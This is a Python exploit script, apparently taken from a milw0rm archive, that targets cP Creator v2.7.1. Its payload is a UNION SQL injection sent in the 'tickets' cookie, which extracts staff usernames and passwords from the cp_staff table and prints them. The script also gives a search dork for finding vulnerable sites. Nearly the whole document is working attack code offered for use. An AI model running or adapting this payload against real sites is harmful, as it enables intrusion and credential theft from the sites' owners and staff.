#!/usr/bin/python
#####################################################################################
####                  cP Creator v2.7.1 Remote Sql Injection                     ####
#####################################################################################
#                                                                                   #
#AUTHOR : Sina Yazdanmehr (R3d.W0rm)                                                #
#Discovered by : Sina Yazdanmehr (R3d.W0rm)                                         #
#Our Site : http://IrCrash.com  -> (Coming Soon Again)                              #
#My Official WebSite : http://R3dW0rm.ir                                            #
#IRCRASH Team Members : Khashayar Fereidani - R3d.w0rm (Sina Yazdanmehr)            #
#####################################################################################
#                                                                                   #
#Download : http://www.cpcreator.net                                                #
#                                                                                   #
#Dork : Powered by cP Creator v2.7.1                                                #
#                                                                                   #
#*** Magic Quotes gpc = Off ***                                                     #
#                                                                                   #
###################################### TNX GOD ######################################
import sys,httplib
p = ''
if len(sys.argv) < 3 :
    print "\nPowered by : R3d.W0rm"
    print "Http://IrCrash.Com - Http://R3dW0rm.Ir"
    print "Usage : code.py [host] /[path]"
    exit()
co = {"Cookie": "tickets=-999' union select 0,concat(0x265E21402A,user,0x3A,pass,0x265E21402A),2,3,4,5,6,7,8 from cp_staff/*;"}
c = httplib.HTTPConnection(sys.argv[1],80)
c.request("GET", "/" + sys.argv[2] + "/?page=support&task=ticket", p, co)
data = c.getresponse().read()
if "&^!@*" not in data :
    print "Attack Failed ."
    exit()
output = data.split("&^!@*")
print "\n+-------------------------------------+"
print "\nPowered by : R3d.W0rm"
print "Http://IrCrash.Com - Http://R3dW0rm.Ir\n"
print "+-------------------------------------+"
print "\n " + output[1]

# milw0rm.com [2009-09-21]